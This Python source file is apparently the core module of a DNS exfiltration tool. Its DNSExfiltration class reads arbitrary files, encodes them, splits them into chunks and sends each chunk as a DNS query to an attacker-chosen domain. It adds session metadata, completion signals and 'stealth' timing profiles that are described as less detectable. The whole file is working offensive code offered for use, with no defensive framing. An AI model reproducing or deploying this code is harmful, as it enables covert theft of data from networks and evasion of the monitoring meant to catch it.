#!/usr/bin/env python3
"""
Core DNS exfiltration class
"""

import secrets
from datetime import datetime
from .encoder import DNSEncoder
from .query_builder import DNSQueryBuilder
from .transmitter import DNSTransmitter
from .timing import TimingController

class DNSExfiltration:
    """Main interface for DNS exfiltration"""
    
    def __init__(self, domain, dns_server=None, chunk_size=50):
        """
        Initialize DNS exfiltration
        
        Args:
            domain: Exfiltration domain
            dns_server: DNS server IP (None for system default)
            chunk_size: Size of data chunks (max 50 for safety)
        """
        self.domain = domain.rstrip('.')
        self.chunk_size = min(chunk_size, 50)  # Cap at 50 for DNS label safety
        self.session_id = secrets.token_hex(4)
        
        # Initialize components
        self.encoder = DNSEncoder()
        self.query_builder = DNSQueryBuilder(domain)
        self.transmitter = DNSTransmitter(dns_server)
        self.timing = TimingController()
        
        print(f"[+] DNS exfiltration initialized")
        print(f"[+] Domain: {self.domain}")
        print(f"[+] Session ID: {self.session_id}")
        print(f"[+] Chunk size: {self.chunk_size} bytes")
        print(f"[+] DNS server: {dns_server or 'System default'}")
    
    def exfiltrate_data(self, data, send_metadata=False):
        """
        Exfiltrate data via DNS
        
        Args:
            data: Data to exfiltrate (string or bytes)
            send_metadata: Whether to send metadata queries
            
        Returns:
            True if successful
        """
        # Prepare data
        encoded, chunks = self.encoder.prepare_for_dns(data, self.chunk_size)
        total_chunks = len(chunks)
        
        print(f"[*] Exfiltrating {len(data)} bytes")
        print(f"[*] Encoded size: {len(encoded)} bytes")
        print(f"[*] Chunks: {total_chunks}")
        
        # Estimate time
        estimated_time = self.timing.calculate_total_time(total_chunks)
        print(f"[*] Estimated time: {estimated_time:.1f} seconds")
        
        # Send metadata if requested
        if send_metadata:
            self._send_metadata(total_chunks, len(data))
        
        # Send chunks
        success_count = 0
        for i, chunk in enumerate(chunks):
            query = self.query_builder.build_chunk_query(i, chunk)
            
            # Validate query
            if not self.query_builder.validate_query_length(query):
                print(f"[-] Chunk {i} query too long, skipping")
                continue
            
            # Send query
            if self.transmitter.send_query_silent(query):
                success_count += 1
                print(f"[+] Sent chunk {i+1}/{total_chunks}")
            else:
                print(f"[-] Failed chunk {i+1}/{total_chunks}")
            
            # Wait before next query
            if i < total_chunks - 1:  # Don't wait after last chunk
                self.timing.wait()
        
        # Send completion signal if metadata was sent
        if send_metadata:
            self._send_completion()
        
        print(f"[+] Exfiltration complete")
        print(f"[+] Success rate: {success_count}/{total_chunks} ({success_count/total_chunks*100:.1f}%)")
        
        return success_count == total_chunks
    
    def exfiltrate_file(self, filepath, send_metadata=False):
        """
        Exfiltrate entire file
        
        Args:
            filepath: Path to file
            send_metadata: Whether to send metadata
            
        Returns:
            True if successful
        """
        print(f"[*] Reading file: {filepath}")
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        print(f"[*] File size: {len(data)} bytes")
        
        return self.exfiltrate_data(data, send_metadata)
    
    def _send_metadata(self, total_chunks, file_size):
        """Send metadata query"""
        query = self.query_builder.build_metadata_query(
            self.session_id, total_chunks, file_size
        )
        
        if self.transmitter.send_query_silent(query):
            print(f"[+] Sent metadata")
    
    def _send_completion(self):
        """Send completion signal"""
        query = self.query_builder.build_completion_query(self.session_id)
        
        if self.transmitter.send_query_silent(query):
            print(f"[+] Sent completion signal")
    
    def test_dns_connectivity(self):
        """Test DNS connectivity"""
        print(f"[*] Testing DNS connectivity...")
        
        if self.transmitter.test_connectivity():
            print(f"[+] DNS is working")
            return True
        else:
            print(f"[-] DNS connectivity failed")
            return False
    
    def set_timing_profile(self, profile='normal'):
        """
        Set timing profile
        
        Args:
            profile: 'aggressive', 'normal', or 'stealth'
        """
        if profile == 'aggressive':
            self.timing.set_aggressive_timing()
            print(f"[*] Timing: Aggressive (fast, more detectable)")
        elif profile == 'stealth':
            self.timing.set_stealth_timing()
            print(f"[*] Timing: Stealth (slow, less detectable)")
        else:
            # Keep defaults
            print(f"[*] Timing: Normal")